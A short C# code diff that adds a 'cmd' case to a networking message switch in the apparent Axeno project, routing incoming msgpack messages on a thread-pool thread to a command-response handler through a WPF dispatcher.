@@ -148,6 +148,19 @@ namespace Axeno.Networking.Communication
                             });
                             break;
                         }
+                    case "cmd":
+                        {
+                            ThreadPool.QueueUserWorkItem(delegate
+                            {
+                                client.cmd.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
+                                {
+                                    new HandleCMD().HandleResponse(client, msgpck);
+
+                                }));
+
+                            });
+                            break;
+                        }
                 }
             }
             catch
